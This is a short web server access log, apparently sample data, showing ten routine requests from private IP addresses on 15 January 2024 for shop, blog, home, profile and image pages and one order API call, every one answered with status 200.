192.168.3.75 - bob [15/Jan/2024:18:12:38 +0000] "GET /shop/item/2 HTTP/1.1" 200 11616 "https://example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
192.168.1.100 - - [15/Jan/2024:18:12:49 +0000] "GET /blog/post/1 HTTP/1.1" 200 6362 "https://example.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
192.168.3.75 - bob [15/Jan/2024:18:13:04 +0000] "GET /home HTTP/1.1" 200 1776 "https://example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
10.0.0.10 - - [15/Jan/2024:18:13:16 +0000] "GET /images/logo.png HTTP/1.1" 200 16360 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
172.16.1.25 - - [15/Jan/2024:18:13:17 +0000] "GET /shop/item/2 HTTP/1.1" 200 1286 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
10.0.1.15 - - [15/Jan/2024:18:13:20 +0000] "GET /blog/post/1 HTTP/1.1" 200 5230 "https://example.com" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
192.168.1.100 - - [15/Jan/2024:18:13:30 +0000] "GET /images/logo.png HTTP/1.1" 200 11058 "https://example.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
192.168.1.100 - - [15/Jan/2024:18:13:32 +0000] "GET /images/logo.png HTTP/1.1" 200 2523 "https://example.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
172.16.0.50 - - [15/Jan/2024:18:13:33 +0000] "POST /api/v1/orders HTTP/1.1" 200 9936 "https://example.com" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
192.168.1.10 - alice [15/Jan/2024:18:13:42 +0000] "GET /home/profile HTTP/1.1" 200 15593 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
